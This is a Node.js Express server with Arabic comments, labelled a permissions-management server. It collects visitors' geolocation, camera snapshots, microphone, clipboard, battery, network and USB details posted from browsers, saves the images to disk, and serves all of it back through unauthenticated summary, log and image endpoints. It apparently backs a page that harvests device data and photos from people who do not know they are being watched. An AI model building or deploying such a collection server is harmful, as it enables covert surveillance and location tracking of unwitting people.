const express = require('express');
const cors = require('cors');
const bodyParser = require('body-parser');
const fs = require('fs');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 3000;

app.use(cors());
app.use(bodyParser.json({ limit: '100mb' }));

const uploadsDir = path.join(__dirname, 'uploads');
if (!fs.existsSync(uploadsDir)) {
    fs.mkdirSync(uploadsDir);
}

const dataFile = path.join(__dirname, 'data.json');
const logsFile = path.join(__dirname, 'logs.json');

// دالة لحفظ في قاعدة البيانات
function saveToDatabase(type, data) {
    let db = { 
        locations: [], 
        snapshots: [], 
        permissions: [],
        notifications: [],
        cameras: [],
        microphones: [],
        clipboards: [],
        storage: [],
        battery: [],
        network: [],
        usb: [],
        midi: []
    };
    
    if (fs.existsSync(dataFile)) {
        try {
            db = JSON.parse(fs.readFileSync(dataFile, 'utf8'));
        } catch (e) {
            console.error('خطأ في قراءة قاعدة البيانات:', e);
        }
    }
    
    const entry = { ...data, timestamp: new Date().toISOString() };
    
    switch(type) {
        case 'location':
            db.locations.push(entry);
            break;
        case 'snapshot':
            const filename = `img_${Date.now()}.png`;
            const base64Data = data.image ? data.image.replace(/^data:image\/png;base64,/, "") : "";
            if (base64Data) {
                fs.writeFileSync(path.join(uploadsDir, filename), base64Data, 'base64');
                db.snapshots.push({ filename, ...data, timestamp: new Date().toISOString() });
            }
            break;
        case 'notifications':
            db.notifications.push(entry);
            break;
        case 'camera':
            db.cameras.push(entry);
            break;
        case 'microphone':
            db.microphones.push(entry);
            break;
        case 'clipboard':
            db.clipboards.push(entry);
            break;
        case 'storage':
            db.storage.push(entry);
            break;
        case 'battery':
            db.battery.push(entry);
            break;
        case 'network':
            db.network.push(entry);
            break;
        case 'usb':
            db.usb.push(entry);
            break;
        case 'midi':
            db.midi.push(entry);
            break;
        case 'permissions':
            db.permissions.push(entry);
            break;
        default:
            db.permissions.push(entry);
    }
    
    fs.writeFileSync(dataFile, JSON.stringify(db, null, 2));
}

// دالة لحفظ السجلات
function saveLogs(log) {
    let logs = [];
    if (fs.existsSync(logsFile)) {
        try {
            logs = JSON.parse(fs.readFileSync(logsFile, 'utf8'));
        } catch (e) {
            logs = [];
        }
    }
    logs.push({ ...log, timestamp: new Date().toISOString() });
    
    // احتفظ بـ 1000 سجل فقط
    if (logs.length > 1000) {
        logs = logs.slice(-1000);
    }
    
    fs.writeFileSync(logsFile, JSON.stringify(logs, null, 2));
}

// ============ API الأساسية ============

// تسجيل الموقع الجغرافي
app.post('/api/location', (req, res) => {
    const { latitude, longitude, accuracy } = req.body;
    if (latitude === undefined || longitude === undefined) {
        return res.status(400).json({ success: false, message: 'بيانات غير صالحة' });
    }
    saveToDatabase('location', { latitude, longitude, accuracy });
    saveLogs({ type: 'location', latitude, longitude });
    res.json({ success: true, message: 'تم حفظ الموقع' });
});

// تسجيل صورة من الكاميرا
app.post('/api/snapshot', (req, res) => {
    const { image } = req.body;
    if (!image) {
        return res.status(400).json({ success: false, message: 'لا توجد صورة' });
    }
    saveToDatabase('snapshot', { image });
    saveLogs({ type: 'snapshot', size: image.length });
    res.json({ success: true, message: 'تم حفظ الصورة' });
});

// ============ API الصلاحيات الجديدة ============

// سجل عام للأحداث
app.post('/api/log', (req, res) => {
    const { type, data } = req.body;
    
    if (!type) {
        return res.status(400).json({ success: false, message: 'نوع السجل مفقود' });
    }
    
    saveToDatabase(type, data);
    saveLogs({ type, ...data });
    
    res.json({ 
        success: true, 
        message: `تم تسجيل ${type} بنجاح`,
        count: true
    });
});

// الإشعارات
app.post('/api/notifications', (req, res) => {
    const { status, message } = req.body;
    saveToDatabase('notifications', { status, message });
    res.json({ success: true, message: 'تم حفظ بيانات الإشعارات' });
});

// الميكروفون
app.post('/api/microphone', (req, res) => {
    const { status, level } = req.body;
    saveToDatabase('microphone', { status, level });
    res.json({ success: true, message: 'تم حفظ بيانات الميكروفون' });
});

// الحافظة
app.post('/api/clipboard', (req, res) => {
    const { status, length } = req.body;
    saveToDatabase('clipboard', { status, length });
    res.json({ success: true, message: 'تم حفظ بيانات الحافظة' });
});

// التخزين
app.post('/api/storage', (req, res) => {
    const { persistent } = req.body;
    saveToDatabase('storage', { persistent });
    res.json({ success: true, message: 'تم حفظ بيانات التخزين' });
});

// البطارية
app.post('/api/battery', (req, res) => {
    const { level, charging } = req.body;
    saveToDatabase('battery', { level, charging });
    res.json({ success: true, message: 'تم حفظ بيانات البطارية' });
});

// الشبكة
app.post('/api/network', (req, res) => {
    const { type, downlink, rtt } = req.body;
    saveToDatabase('network', { type, downlink, rtt });
    res.json({ success: true, message: 'تم حفظ بيانات الشبكة' });
});

// أجهزة USB
app.post('/api/usb', (req, res) => {
    const { count, devices } = req.body;
    saveToDatabase('usb', { count, devices });
    res.json({ success: true, message: 'تم حفظ بيانات USB' });
});

// أجهزة MIDI
app.post('/api/midi', (req, res) => {
    const { status } = req.body;
    saveToDatabase('midi', { status });
    res.json({ success: true, message: 'تم حفظ بيانات MIDI' });
});

// ============ API الإحصائيات والبيانات ============

// الحصول على ملخص البيانات
app.get('/api/summary', (req, res) => {
    let db = { 
        locations: [], 
        snapshots: [], 
        permissions: [],
        notifications: [],
        cameras: [],
        microphones: [],
        clipboards: [],
        storage: [],
        battery: [],
        network: [],
        usb: [],
        midi: []
    };
    
    if (fs.existsSync(dataFile)) {
        try {
            db = JSON.parse(fs.readFileSync(dataFile, 'utf8'));
        } catch (e) {
            console.error('خطأ في قراءة البيانات:', e);
        }
    }
    
    const summary = {
        total_locations: db.locations.length,
        total_snapshots: db.snapshots.length,
        total_events: (db.locations || []).length + (db.snapshots || []).length + (db.permissions || []).length,
        last_location: db.locations[db.locations.length - 1] || null,
        last_snapshot: db.snapshots[db.snapshots.length - 1] || null,
        permissions: {
            camera: (db.cameras || []).length,
            microphone: (db.microphones || []).length,
            notifications: (db.notifications || []).length,
            clipboard: (db.clipboards || []).length,
            storage: (db.storage || []).length,
            battery: (db.battery || []).length,
            network: (db.network || []).length,
            usb: (db.usb || []).length,
            midi: (db.midi || []).length
        }
    };
    
    res.json(summary);
});

// الحصول على آخر السجلات
app.get('/api/logs', (req, res) => {
    const limit = req.query.limit || 50;
    let logs = [];
    
    if (fs.existsSync(logsFile)) {
        try {
            logs = JSON.parse(fs.readFileSync(logsFile, 'utf8'));
        } catch (e) {
            logs = [];
        }
    }
    
    const recent = logs.slice(-limit);
    res.json({ count: recent.length, logs: recent });
});

// الحصول على جميع الصور
app.get('/api/images', (req, res) => {
    try {
        const files = fs.readdirSync(uploadsDir);
        const images = files.map(file => ({
            filename: file,
            path: `/uploads/${file}`,
            size: fs.statSync(path.join(uploadsDir, file)).size
        }));
        res.json({ count: images.length, images });
    } catch (e) {
        res.status(500).json({ error: 'خطأ في قراءة الملفات' });
    }
});

// تقديم الصور الملتقطة
app.use('/uploads', express.static(uploadsDir));

// الصحة والاختبار
app.get('/health', (req, res) => {
    res.json({ 
        status: 'ok', 
        uptime: process.uptime(),
        timestamp: new Date().toISOString()
    });
});

// الصفحة الرئيسية
app.get('/', (req, res) => {
    res.send(`
        <!DOCTYPE html>
        <html lang="ar" dir="rtl">
        <head>
            <meta charset="UTF-8">
            <title>خادم الصلاحيات</title>
            <style>
                body { font-family: Arial; margin: 40px; direction: rtl; }
                h1 { color: #333; }
                .info { background: #f0f0f0; padding: 10px; margin: 10px 0; }
            </style>
        </head>
        <body>
            <h1>🔐 خادم إدارة الصلاحيات</h1>
            <p>الخادم يعمل بنجاح ✅</p>
            <div class="info">
                <strong>API المتاحة:</strong>
                <ul>
                    <li>POST /api/location - تسجيل الموقع</li>
                    <li>POST /api/snapshot - حفظ صورة من الكاميرا</li>
                    <li>POST /api/log - تسجيل حدث عام</li>
                    <li>POST /api/notifications - تسجيل الإشعارات</li>
                    <li>POST /api/microphone - تسجيل الميكروفون</li>
                    <li>POST /api/clipboard - تسجيل الحافظة</li>
                    <li>POST /api/storage - تسجيل التخزين</li>
                    <li>POST /api/battery - تسجيل البطارية</li>
                    <li>POST /api/network - تسجيل الشبكة</li>
                    <li>POST /api/usb - تسجيل أجهزة USB</li>
                    <li>POST /api/midi - تسجيل أجهزة MIDI</li>
                    <li>GET /api/summary - ملخص البيانات</li>
                    <li>GET /api/logs - السجلات الأخيرة</li>
                    <li>GET /api/images - قائمة الصور</li>
                </ul>
            </div>
        </body>
        </html>
    `);
});

app.listen(PORT, () => {
    console.log(`🚀 الخادم يعمل على المنفذ ${PORT}`);
    console.log(`📍 رابط الخادم: http://localhost:${PORT}`);
});
